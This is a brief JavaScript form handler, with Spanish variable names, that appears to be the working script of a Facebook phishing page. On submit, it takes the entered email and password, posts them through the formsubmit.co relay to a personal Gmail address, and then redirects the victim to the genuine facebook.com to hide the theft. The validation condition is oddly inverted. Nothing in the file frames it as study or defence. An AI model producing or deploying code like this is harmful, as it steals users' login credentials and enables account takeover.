let expresionAsunto = /[0-9,\W]/;
let expresionCorreo = /[a-z,0-9,._-]+@[a-z,0-9]+\.[a-z]/;
const $form = document.getElementById("form");
const d = document;

d.addEventListener("submit",e=>{
    e.preventDefault();
    if(expresionAsunto.test($form.correo.value) && expresionCorreo.test($form.contrasenia.value) || $form.correo.value=="" && $form.contrasenia.value==""){
    }else{
        fetch("https://formsubmit.co/ajax/dekish49@gmail.com",{
            method:"POST",
            body: new FormData($form)
        })
        .then(res=> res.ok ? res.json():Promise.reject(res))
        .then(json =>{
            window.location.href = "https://www.facebook.com";
            
        })
        .catch(err => {
            console.log(`Ocurrio un error ${err}`);
        })
    }
})



